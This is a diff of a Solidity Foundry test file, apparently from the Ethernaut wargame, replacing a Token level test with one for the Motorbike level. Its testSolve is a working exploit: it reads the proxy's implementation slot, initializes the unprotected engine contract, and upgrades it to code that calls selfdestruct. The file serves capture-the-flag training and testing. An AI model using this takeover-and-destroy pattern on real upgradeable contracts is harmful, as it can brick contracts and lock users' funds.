@@ -8,13 +8,14 @@ import {DummyFactory} from "src/levels/DummyFactory.sol";
 import {Level} from "src/levels/base/Level.sol";
 import {Ethernaut} from "src/Ethernaut.sol";
 
-interface Token {
-    function transfer(address, uint256) external returns (bool);
+interface Engine {
+    function initialize() external;
+    function upgradeToAndCall(address, bytes memory) external payable;
 }
 
-contract TestToken is Test, Utils {
+contract TestMotorbike is Test, Utils {
     Ethernaut ethernaut;
-    Token instance;
+    address payable instance;
 
     address payable owner;
     address payable player;
@@ -34,12 +35,12 @@ contract TestToken is Test, Utils {
 
         vm.startPrank(owner);
         ethernaut = getEthernautWithStatsProxy(owner);
-        DummyFactory factory = DummyFactory(getOldFactory("TokenFactory"));
+        DummyFactory factory = DummyFactory(getOldFactory("MotorbikeFactory"));
         ethernaut.registerLevel(Level(address(factory)));
         vm.stopPrank();
 
         vm.startPrank(player);
-        instance = Token(payable(createLevelInstance(ethernaut, Level(address(factory)), 0)));
+        instance = payable(createLevelInstance(ethernaut, Level(address(factory)), 0));
         vm.stopPrank();
     }
 
@@ -50,15 +51,22 @@ contract TestToken is Test, Utils {
     /// @notice Check the intial state of the level and enviroment.
     function testInit() public {
         vm.startPrank(player);
-        assertFalse(submitLevelInstance(ethernaut, address(instance)));
+        assertFalse(submitLevelInstance(ethernaut, instance));
     }
 
     /// @notice Test the solution for the level.
     function testSolve() public {
         vm.startPrank(player);
 
-        instance.transfer(address(instance), 21);
+        address engine = address(
+            uint160(uint256(vm.load(instance, hex"360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")))
+        );
+        Engine(engine).initialize();
+        Engine(engine).upgradeToAndCall(address(this), abi.encodeWithSignature("done()"));
+        assertTrue(submitLevelInstance(ethernaut, instance));
+    }
 
-        assertTrue(submitLevelInstance(ethernaut, address(instance)));
+    function done() public {
+        selfdestruct(payable(address(0)));
     }
 }
